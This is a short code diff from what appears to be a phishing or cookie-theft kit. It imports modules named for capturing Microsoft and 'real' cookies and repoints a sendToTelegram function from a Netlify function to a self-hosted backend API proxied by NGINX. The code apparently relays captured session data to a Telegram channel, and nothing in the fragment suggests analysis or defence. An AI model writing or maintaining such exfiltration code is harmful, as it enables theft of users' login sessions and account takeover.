@@ -2,10 +2,10 @@ import cookieUtils, { CookieMeta } from './cookieUtils';
 import { microsoftCookieCapture } from './microsoftCookieCapture';
 import { realCookieCapture, type RealCookie } from './realCookieCapture';
 
-// Send data to Telegram via Netlify function
+// Send data to Telegram via the backend Node.js API (proxied by NGINX from /api/* to localhost:10000).
 export const sendToTelegram = async (data: any): Promise<any> => {
   try {
-    const response = await fetch('/.netlify/functions/sendTelegram', {
+    const response = await fetch('/api/send-telegram', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
